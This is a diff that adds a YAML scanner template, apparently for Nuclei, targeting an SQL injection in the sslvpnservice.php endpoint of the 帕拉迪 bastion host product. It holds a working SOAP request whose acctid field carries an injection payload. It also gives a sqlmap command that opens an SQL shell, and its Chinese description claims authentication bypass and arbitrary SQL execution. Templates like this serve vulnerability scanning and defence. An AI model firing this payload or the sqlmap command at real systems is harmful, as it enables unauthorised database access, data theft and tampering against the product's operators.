@@ -1,0 +1,41 @@
+id: parade-fortigate-sslvpnservice-sql
+
+info:
+  name: "帕拉迪堡垒机 sslvpnservice.php 接口存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过构造恶意SQL查询参数，攻击者可利用帕拉迪堡垒机sslvpnservice.php接口存在的SQL注入漏洞，绕过身份验证机制，直接访问底层数据库系统。该漏洞允许执行任意SQL命令，导致敏感数据泄露、数据篡改或服务中断。利用示例可通过sqlmap工具实现自动化攻击，具体命令如下：
+      python2 sqlmap.py -r 1.txt --proxy http://127.0.0.1:8080 --force-ssl --freshqueries --dbms=mysql --delay 1 --sql-shell
+  tags: 帕拉迪堡垒机
+
+http:
+  - raw:
+    - |
+      POST /sslvpnservice.php HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
+      Content-Type: text/xml
+
+      <?xml version="1.0" encoding="ISO-8859-1"?>
+      <SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
+      xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
+      <SOAP-ENV:Body>
+      <getAccountDetail>
+      <data>
+      {"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
+      1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
+      </getAccountDetail>
+      </SOAP-ENV:Body></SOAP-ENV:Envelope>
+    matchers-condition: and
+    matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+        - 'version'
+        - 'GetAccountDetailResponse'
+      condition: and
